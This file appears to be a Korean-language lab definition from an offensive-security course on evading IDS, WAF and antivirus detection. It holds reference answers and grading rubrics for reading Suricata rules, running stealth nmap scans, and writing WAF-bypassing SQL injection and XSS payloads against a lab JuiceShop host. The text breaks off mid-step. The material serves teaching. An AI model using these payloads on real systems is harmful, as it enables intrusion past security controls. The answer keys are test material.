lab_id: attack-nonai-week12
title: 은닉 기법 (Evasion)
version: non-ai
course: attack-nonai
week: 12
description: IDS/IPS, WAF, 안티바이러스 등 보안 장비의 탐지를 우회하는 은닉(Evasion) 기법을 실습한다. 패킷 분할, 인코딩,
  난독화, 타이밍 기법 등을 학습한다.
difficulty: medium
duration_minutes: 120
objectives:
- Suricata IDS/IPS의 탐지 규칙을 이해하고 우회 방법을 실습한다
- WAF 우회 기법(인코딩, 대소문자 혼합, 주석 삽입)을 수행할 수 있다
- 공격 도구의 시그니처를 변경하여 탐지를 회피할 수 있다
pass_threshold: 0.6
steps:
- order: 1
  instruction: secu 서버({{SECU_IP}})의 Suricata 규칙을 확인하여 현재 활성화된 탐지 규칙을 파악하라.
  hint: SSH로 secu에 접속하여 Suricata 규칙 파일을 확인한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.1 'ls /etc/suricata/rules/ 2>/dev/null; echo ---; cat /etc/suricata/rules/local.rules
    2>/dev/null | head -20' 2>/dev/null
  answer_detail: IDS/IPS 규칙을 사전에 파악하면 탐지를 우회하는 페이로드를 설계할 수 있다. Suricata는 시그니처 기반 탐지를
    사용하므로 규칙에 매칭되지 않는 변형 공격은 탐지되지 않는다.
  verify:
    type: output_contains
    expect: '---'
    field: stdout
    semantic:
      intent: Suricata 룰 확인 — ssh secu 'ls /etc/suricata/rules/; cat /etc/suricata/rules/local.rules'.
        MITRE T1518.001 Security Software Discovery. 시그니처 기반 탐지 사전 파악 → 변형 페이로드 설계.
        Emerging Threats ET open 룰셋 구조 이해.
      success_criteria:
      - /etc/suricata/rules 경로 읽기
      - '--- 구분자 + local.rules 내용'
      - SSH 원격 실행
      acceptable_methods:
      - "ssh ccc@10.20.30.1 'ls /etc/suricata/rules/' (수기 baseline). 출력: local.rules
        emerging-threats.rules suricata.rules. 해석: 어떤 룰셋이 enable 인지 한눈에. local.rules
        는 학생/관리자 custom alert 가 모이는 첫 점검 대상."
      - "ssh secu 'cat /etc/suricata/rules/local.rules | head -30'. 출력: alert tcp
        any any -> any 22 (msg:\"SSH Brute\"; ...; sid:1000001;). 해석: msg / content
        / sid 분석 후 동일 의미 다른 시그니처(예: 대소문자 혼합) 페이로드 설계 가능."
      - "ssh secu 'grep -rE \"^alert\" /etc/suricata/rules/ | head -20'. 출력: 활성 alert
        룰만 추출 (#주석 제외). 해석: alert vs drop vs reject 비율 → IPS 모드 활성 여부 판정."
      - "ssh secu 'cat /etc/suricata/suricata.yaml | grep -A20 \"rule-files:\"'. 출력:
        - local.rules - emerging-threats.rules 등. 해석: 어떤 룰 파일이 로드되는지 config 차원에서 확인.
        파일은 있어도 yaml 에 없으면 무시됨."
      - "ssh secu 'systemctl status suricata --no-pager | head -10'. 출력: Active: active
        (running) since ...; Tasks: 8; Memory: 200M. 해석: 룰 reload 시점 추정 + suricata
        process 가 실제 트래픽 검사 중인지 검증."
      - "ssh secu 'sudo suricata --list-keywords | head -30'. 출력: content / pcre /
        flow / dsize / threshold .... 해석: 어떤 매칭 키워드가 사용 가능한지 → content 기반 룰은 우회
        쉬움 / pcre 는 어려움 차별 인식."
      - "ssh secu 'sudo suricata-update list-sources 2>&1 | head -20'. 출력: ET Open /
        ET Pro / abuse.ch ssl / ... 해석: 외부 룰셋 어느 것 등록됐는지 → 시그니처 데이터셋의 출처 파악
        후 OSS 우회 정보 검색."
      - "ssh secu 'sudo suricatasc -c ruleset-stats 2>/dev/null'. 출력: { id: 1, rules_loaded:
        45000, rules_failed: 0 }. 해석: unix-socket runtime 명령. 룰 reload 안 해도 활성 룰
        수 / 로드 실패 룰 즉시 확인 가능."
      negative_signs:
      - 규칙 파일 경로 없음 (cat 만 빈 출력)
      - 단순 ls (내용 없음, 시그니처 분석 없음)
      - 시그니처 기반 회피 맥락 없음 (그냥 룰 나열만)
      - alert/drop 구분 없이 통째 dump
      - msg/content/sid 핵심 필드 무시
  target_vm: attacker
- order: 2
  instruction: nmap 스캔의 탐지를 줄이기 위해 스텔스 기법을 적용하라. 느린 타이밍(-T1), 패킷 분할(-f), 디코이(-D)를
    사용하라.
  hint: -T1은 Sneaky 타이밍, -f는 패킷 분할, -D는 디코이이다
  category: exploit
  points: 10
  answer: 'sudo nmap -sS -T1 -f -D RND:3 -p 22,80,3000 10.20.30.80 2>/dev/null | head
    -20 && echo ''Stealth scan completed with: T1 timing, fragmentation, 3 random
    decoys'''
  answer_detail: -T1(Sneaky)은 패킷 전송 간격을 15초로 늘려 IDS의 시간 기반 탐지를 회피한다. -f는 패킷을 8바이트
    단위로 분할하여 시그니처 매칭을 방해한다. -D는 디코이 IP를 추가하여 실제 스캐너를 식별하기 어렵게 만든다.
  verify:
    type: output_contains
    expect: Stealth scan
    field: stdout
    semantic:
      intent: nmap 스텔스 조합 — sudo nmap -sS -T1 -f -D RND:3 -p 22,80,3000 target. MITRE
        T1046 + T1090 Proxy. -T1(Sneaky 15초 간격) + -f(8바이트 분할) + -D RND:3(랜덤 디코이 3개).
        시간+분할+디코이 3축 회피.
      success_criteria:
      - -T1 + -f + -D 3옵션 조합
      - Stealth scan 키워드
      - 3가지 회피 축 설명
      acceptable_methods:
      - "sudo nmap -sS -T1 -f -D RND:3 -p 22,80,3000 10.20.30.80 (수기 baseline). 출력:
        Scanning 4 hosts ... PORT STATE SERVICE 22/tcp open ssh ... (스캔 ~6 분 걸림). 해석:
        T1 = 15s 패킷 간격 (시간 상관 회피) + -f = 8B 분할 (시그니처 매칭 방해) + -D RND:3 = 랜덤 디코이
        3 IP. 3축 회피 동시 적용."
      - "sudo nmap -sS --scan-delay 10s --max-rate 5 -p 22,80,3000 10.20.30.80. 출력:
        Stats: 0:00:30 elapsed; 1 hosts completed. 해석: --scan-delay 는 probe 간 강제
        간격 (T 옵션보다 정밀), --max-rate 5 = 초당 5 패킷 cap. 사용자 정의 슬로우 스캔."
      - "sudo nmap -sS -f --mtu 16 -p 22,80,3000 10.20.30.80. 출력: Note: Fragment scans
        require MTU multiple of 8. 해석: --mtu 로 분할 크기 직접 지정 (8B 의 배수). 16B = 더 작은
        분할 = 시그니처 더 깨짐."
      - "sudo nmap -sS -D 10.0.0.5,10.0.0.6,ME,10.0.0.7 -p 22 10.20.30.80. 출력: PORT
        22/tcp open ssh. 해석: ME 위치 명시로 실제 스캐너 IP 가 디코이 사이 어디에 위치할지 통제. RND:3
        보다 의도적 위장."
      - "sudo masscan -p22,80,3000 10.20.30.80 --rate 10 --wait 5. 출력: Discovered
        open port 22/tcp on 10.20.30.80. 해석: masscan 자체는 빠른 스캐너지만 --rate 10 +
        --wait 5 로 슬로우 모드. nmap NSE 시그니처와 다른 패킷 fingerprint."
      - "sudo hping3 -S -p 22 --interval u500000 -c 10 10.20.30.80. 출력: 10 packets
        transmitted, 10 received. 해석: hping3 raw TCP SYN. --interval u500000 = 0.5s
        간격. nmap 시그니처 회피용 대체 도구. -c 카운트로 노출 한정."
      - "sudo unicornscan -mT -r 5 -I 10.20.30.80:22 2>&1 | head. 출력: TCP open ssh[
        22] from 10.20.30.80. 해석: unicornscan = nmap 와 다른 패킷 stack 사용 → IDS 가
        nmap fingerprint 기반이면 우회 가능. -r 5 = 초당 5 패킷."
      - "sudo nmap -sS -T1 -f -D RND:3 --data-length 50 --randomize-hosts -p 22,80,3000
        10.20.30.80. 출력: stealth scan completed (모든 옵션 + 데이터 패딩). 해석: 4축 결합
        — 타이밍/분할/디코이/패딩. 단일 옵션 회피 룰 (예: -f 만 잡는 sid) 도 통과."
      negative_signs:
      - 옵션 1개 이하 (단순 -sS 만)
      - 스텔스 맥락 없음 (왜 회피하는지 설명 없음)
      - 디코이 없음 + 분할 없음 + 타이밍 없음 (모든 회피 축 누락)
      - T0/T2 같은 빠른 타이밍 (탐지 무방비)
      - 결과 해석 없이 raw output dump
  target_vm: attacker
- order: 3
  instruction: WAF 우회를 위해 SQL Injection 페이로드를 다양하게 변형하라. 대소문자 혼합, 주석 삽입, 인코딩 등을 적용하라.
  hint: UNION SELECT를 uNiOn SeLeCt, UN/**/ION SE/**/LECT 등으로 변형한다
  category: exploit
  points: 10
  answer: 'echo ''=== SQLi Evasion Payloads ==='' && echo ''1. Case mixing: uNiOn
    SeLeCt'' && echo ''2. Comment insertion: UN/**/ION SEL/**/ECT'' && echo ''3. URL
    encoding: %55%4e%49%4f%4e%20%53%45%4c%45%43%54'' && echo ''4. Double URL encoding:
    %2555%254e%2549%254f%254e'' && echo ''5. Null byte: UNION%00SELECT'' && echo ''6.
    Tab/newline: UNION%09SELECT, UNION%0aSELECT'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20uNiOn%20SeLeCt%201,2,3,4,5,6,7,8,9--''
    | head -c 200'
  answer_detail: WAF는 보통 정규표현식으로 공격 패턴을 탐지한다. 대소문자 혼합, SQL 주석(/**/)을 이용한 키워드 분할, URL
    이중 인코딩 등으로 정규표현식 매칭을 우회할 수 있다.
  verify:
    type: output_contains
    expect: SQLi Evasion
    field: stdout
    semantic:
      intent: SQLi WAF 우회 페이로드 — 대소문자 혼합(uNiOn SeLeCt) + 주석(/**/) + URL 인코딩 + 이중 인코딩(%2555)
        + null byte(%00) + 탭/개행(%09/%0a). OWASP WAF Bypass Cheatsheet. 정규표현식 기반 시그니처
        회피.
      success_criteria:
      - SQLi Evasion 키워드
      - 변형 기법 4개 이상 (case/주석/인코딩/이중)
      - 실 페이로드 URL 테스트
      acceptable_methods:
      - "대소문자+주석+URL 인코딩 혼합 변형 (수기 baseline). 명령: curl 'http://10.20.30.80:3000/rest/products/search?q=test%27%29%20uNiOn%20SeLeCt%201,2,3,4,5,6,7,8,9--'.
        출력: HTTP 200 + JSON results. 해석: 단일 정규식 룰 (예: /UNION\\s+SELECT/i)
        은 통과. 대소문자 + 주석 + 인코딩 3축 동시 적용."
      - "sqlmap --tamper=between,space2comment,charunicodeencode -u 'http://10.20.30.80:3000/rest/products/search?q=test'
        --batch. 출력: [INFO] testing 'space2comment' tamper script... [INFO] heuristic
        confirms vulnerable. 해석: tamper 스크립트로 페이로드 자동 변형. between(=
        BETWEEN), space2comment(공백→/**/), charunicodeencode 조합."
      - "wfuzz -z file,/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -u 'http://10.20.30.80:3000/rest/products/search?q=FUZZ'.
        출력: 000000123: 200 ... \"q\":\"' OR 1=1--\". 해석: SecLists 의 SQLi 페이로드 60+
        변형 자동 fuzz. 응답 코드 차이로 WAF 통과/차단 매핑."
      - "Burp Suite Intruder + payload processing rule 'Match and Replace UNION→UN/**/ION'.
        출력: Request 1: 403 / Request 2: 200 (인코딩) / Request 3: 200 (대소문자). 해석:
        Burp processing rule chain 으로 한 base payload → N 변형 자동. 결과 code 매트릭스."
      - "echo \"' OR 1=1--\" | xxd -p (hex 인코딩). 출력: 27204f5220313d312d2d. URL: %27%20OR%201%3D1--.
        해석: hex/URL/이중URL 인코딩 단계. 페이로드를 다중 인코딩 후 WAF 디코딩 단계 차이 악용 (CRS 의 일부 룰은
        한 번만 디코드)."
      - "python3 -c 'import urllib.parse; print(urllib.parse.quote(urllib.parse.quote(\"\\'\\
        OR 1=1--\")))'. 출력: %2527%2520OR%25201%253D1--. 해석: 이중 URL 인코딩.
        브라우저/curl 한 번 디코드 → 서버 두 번 디코드. WAF 가 한 번만 디코드하면 통과."
      - "curl --data-urlencode 'q=test\\u0027 OR 1=1--' http://10.20.30.80:3000/rest/products/search.
        출력: HTTP 200 + 검색 결과. 해석: 유니코드 escape (\\u0027 = ') 형태. 일부 WAF 는 유니코드
        normalize 단계 누락 → 시그니처 매칭 실패."
      - "OWASP CRS exclusion rule + paranoia level 1 환경에서 페이로드 검증 — curl 후 sudo grep
        'id \\\"942100\\\"' /var/log/apache2/error.log. 출력: [Wed Apr ...] ModSecurity:
        Warning. Pattern match \"...\" id \"942100\" msg \"SQL Injection Attack\". 해석:
        어떤 변형이 어떤 CRS sid 에 잡히는지 매핑 → 잡히지 않는 변형이 우회 페이로드."
      negative_signs:
      - 변형 2개 이하 (대소문자 한 가지만 등)
      - 정규식/시그니처 회피 맥락 없음 (왜 변형하는지 설명 없음)
      - 실 HTTP 요청 없음 (이론만)
      - 인코딩 단계 없음 (생 ASCII payload 만)
      - 응답 코드 비교 없음 (어느 변형이 통과했는지 모름)
  target_vm: attacker
- order: 4
  instruction: XSS 페이로드의 WAF 우회 변형을 만들어라. <script> 태그 없이 JavaScript를 실행하는 방법을 시연하라.
  hint: 이벤트 핸들러(onerror, onload), SVG, img 태그 등을 활용한다
  category: exploit
  points: 10
  answer: 'echo ''=== XSS Evasion Payloads ==='' && echo ''1. Event handler: <img
    src=x onerror=alert(1)>'' && echo ''2. SVG: <svg onload=alert(1)>'' && echo ''3.
    Body: <body onload=alert(1)>'' && echo ''4. Encoded: <img src=x onerror=\x61\x6c\x65\x72\x74(1)>''
    && echo ''5. Data URI: <a href="data:text/html,<script>alert(1)</script>">click</a>''
    && echo ''6. Template literal: ${alert(1)}'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=<img%20src%3Dx%20onerror%3Dalert(1)>''
    | head -c 200'
  answer_detail: WAF가 <script> 태그를 차단해도 HTML 이벤트 핸들러(onerror, onload, onfocus), SVG
    태그, data URI 등 다양한 경로로 JavaScript를 실행할 수 있다. WAF 우회는 끊임없는 공격-방어 경쟁이다.
  verify:
    type: output_contains
    expect:
    - XSS Evasion
    - payload
    field: stdout
    semantic:
      intent: XSS WAF 우회 — img onerror / svg onload / body onload / data URI / template
        literal ${alert(1)} / hex escape \x61. OWASP XSS Filter Evasion Cheatsheet.
        <script> 차단 시 이벤트 핸들러/SVG/data URI 대체.
      success_criteria:
      - XSS Evasion 키워드
      - 변형 페이로드 4개 이상
      - 실제 URL 인코딩 테스트
      acceptable_methods:
      - "이벤트 핸들러 + SVG + data URI 페이로드 작성 (수기 baseline). 명령: echo '<img src=x
        onerror=alert(1)>' '<svg onload=alert(1)>' '<body onload=alert(1)>'. 출력: 3
        변형 출력. 해석: <script> 차단 시 onerror/onload/onfocus 등 HTML 이벤트 핸들러 + SVG/
        data URI 로 JavaScript 실행 경로 우회."
      - "curl 'http://10.20.30.80:3000/rest/products/search?q=<img%20src%3Dx%20onerror%3Dalert(1)>'.
        출력: HTTP 200 / 200 / 403 (페이로드별). 해석: URL 인코딩된 페이로드 → JuiceShop 응답 후
        DOM 에 reflected. ModSecurity 941100 룰 매칭 여부 측정."
      - "dalfox url 'http://10.20.30.80:3000/rest/products/search?q=' --skip-bav. 출력:
        [V] [POC][R][POST] http://...?q=<svg/onload=alert(1)>. 해석: dalfox = Go 기반
        XSS 자동 스캐너. payload database 800+ 변형 자동 시도 + browser-based verification."
      - "xsstrike -u 'http://10.20.30.80:3000/rest/products/search?q=test' --crawl --skip-dom.
        출력: [+] Vulnerable parameter: q [+] Payload: <svg/onload=alert(1)>. 해석:
        XSStrike = Python 기반. AI 기반 페이로드 mutation. WAF fingerprint 후 자동 회피 페이로드
        생성."
      - "OWASP XSS Filter Evasion Cheatsheet 의 polyglot payload — \"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\\\"/+/onmouseover=1/+/[*/[]/+alert(42);//'>\".
        출력: alert 트리거. 해석: 한 개의 페이로드가 6+ 컨텍스트 (HTML/JS/attribute/comment 등)에서 실행.
        다중 컨텍스트 동시 회피."
      - "echo '<img src=x onerror=eval(atob(\"YWxlcnQoMSk=\"))>' (base64 인코딩 페이로드). 출력:
